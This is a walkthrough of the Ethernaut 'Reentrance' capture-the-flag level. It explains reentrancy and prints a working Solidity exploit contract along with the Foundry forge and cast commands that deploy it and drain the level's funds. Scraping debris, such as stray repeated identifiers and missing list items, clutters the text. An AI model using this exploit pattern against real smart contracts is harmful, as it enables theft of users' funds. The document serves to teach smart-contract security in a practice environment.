@@ -1,0 +1,151 @@
+"This is by far one of my favorite attacks in Smart Contracts because the repercussions it has could compromise the whole contract, its funds, users, or the ownership, depending on the code logic. 
+The goal of this level is to steal all the funds from the contract.
+To understand this level, we must know what a Reentrancy is. Let's dive in. 
+This is a class of vulnerabilities in smart contracts where attackers recursively call the functions in a vulnerable smart contract, in which there are external calls, before the contract could make sensitive state changes. 
+What this means is that, let's say there are two contracts, A and B. Contract A has a function that is vulnerable to reentrancy, i.e.,
+A
+B
+If these two conditions are met, then it might be possible for an attacker to reenter back into the vulnerable contract by recursively calling the vulnerable function. This will allow them to make the said external calls multiple times and the sensitive state-changing statements will never be executed because the flow will never reach that part. 
+Again, this is explained really well in Solidity By Example.
+Imagine if the external call is transferring some funds to an attacker-controlled address, and it is updating the remaining balance after the external call. This scenario could very well be exploited by the attacker to withdraw all the funds before their balance update takes place. We will be doing the same thing with this level. 
+Let's take a look at the vulnerable function - withdraw(). 
+withdraw()
+function withdraw(uint _amount) public {
+    if(balances[msg.sender] >= _amount) { // validation to check if my user has balance
+        (bool result,) = msg.sender.call{value:_amount}(""""); // external call to an address controlled by us
+            if(result) {
+                _amount;
+            }
+        balances[msg.sender] -= _amount; // balance update but after the external call
+    }
+}
+
+This function is taking some Ether in _amount and making sure that the balance of the user who initiated the function call should be greater than or equal to the amount. 
+_amount
+It is then making an external call to msg.sender's address. This is a big RED FLAG as this address can be controlled by our user since we are the msg.sender. 
+msg.sender
+msg.sender
+After the external call, the function is then updating the balance for our user in the mapping balances[msg.sender]. Since this is happening after the external call, we can exploit this behavior so that the function never reaches this line to update user balance. 
+balances[msg.sender]
+There's another function called donate() - 
+donate()
+function donate(address _to) public payable {
+    balances[_to] = balances[_to].add(msg.value);
+}
+
+This function deposits the Ether to the address supplied in the function arguments. We will need to call this so that we are able to validate the if condition in the withdraw() function - if(balances[msg.sender] >= _amount). 
+if
+withdraw()
+if(balances[msg.sender] >= _amount)
+To exploit this level, we will be deploying a malicious contract with some balance and use that to make calls to the Ethernaut's instance:
+donate()
+fallback()
+receive()
+withdraw()
+withdraw()
+ receive() external payable {
+     level10.withdraw(msg.value);
+ }
+
+withdraw()
+if
+withdraw()
+msg.sender.call{value:_amount}("""");
+_amount
+receive()
+receive()
+withdraw()
+level10.withdraw(msg.value);
+Let's implement this logic in our code. 
+PS: Wherever I've mentioned Reentrance contract, I'm talking about the Ethernaut's level instance or their vulnerable contract. 
+Reentrance contract
+Here's how our exploit code looks:
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import ""../instances/Ilevel10.sol"";
+
+contract Reenter{
+
+    Reentrance level10 = Reentrance(0xA7DE2aFF32f567eA36FC25441cde801879BE5534);
+
+    constructor () public payable {}
+
+    function donate(address _to) external payable {
+        level10.donate{value: 0.001 ether}(_to);
+    }
+
+    function withdraw() external{
+        level10.withdraw(0.001 ether);
+    }
+
+    function getBalance(address _who) external view returns (uint){
+        return address(_who).balance;
+    }
+
+    function fundmeback(address payable _to) external payable{
+        require(_to.send(address(this).balance), ""could not send Ether"");
+    }
+
+    receive() external payable {
+        level10.withdraw(msg.value);
+    }
+}
+
+constructor()
+donate()
+0.001
+withdraw()
+withdraw()
+0.001
+getBalance()
+fundmeback()
+receive()
+withdraw()
+msg.value
+_amount
+withdraw()
+Let's deploy our contract using the following command. The --value is the Ether that will be received by our constructor. 
+--value
+forge create Reenter --private-key $PKEY --rpc-url $RPC_URL --value 0.002ether
+
+
+Now that our contract is deployed, let's make a call to the donate() function using the following command:
+donate()
+cast send <attacker_contract_address> ""donate(address)"" ""<instance_address>"" --private-key $PKEY --rpc-url $RPC_URL
+
+I'm specifically donating 0.001 Ether because the contract's balance is already 0.001 Ether. If we deposit 0.001 Ether more, the reentrancy attack would be completed in 2 reentrant calls.
+0.001
+0.001
+0.001
+The balance can be checked by calling our getBalance() function and passing the contract's address in it: 
+getBalance()
+cast call  <deployed_contracts_address> ""getBalance(address)"" ""<Reentrancy_contracts_address>"" --private-key $PKEY --rpc-url $RPC_URL | cast --to-dec
+
+ Once our contract calls the deposit() function, Reentrance contract's new balance will be 2000000000000000 wei or 0.002 Ether as can be seen below:
+deposit()
+2000000000000000
+0.002
+
+Now on to the next step, let's call the withdraw() function in our contract:
+withdraw()
+cast send 0xB4eaFb65cd17152D3837F764884Db1Cb00e4Db77 ""withdraw()"" --private-key $PKEY --rpc-url $RPC_URL --gas-limit 1000000
+
+Just add another 0 to the --gas-limit 1000000 if it reverts. 
+--gas-limit 1000000
+
+This should trigger the reentrancy and the Ethernaut's contract should make two transfers of 0.001 Ether each. 
+Etherscan confirms that this was a success. 
+
+0.001
+Now let's check the updated balances of both the contracts:
+
+It can be seen that the Reentrance contract's balance is 0 and ours is updated to 0.003 wei. The attack was successful and we have drained the Reentrance contract. The instance can now be submitted to finish the level. 
+0
+0.003
+My Github Repository containing all the codes: github.com/az0mb13/ethernaut-foundry
+check-effect-interaction
+call()
+send
+transfer
+call()"
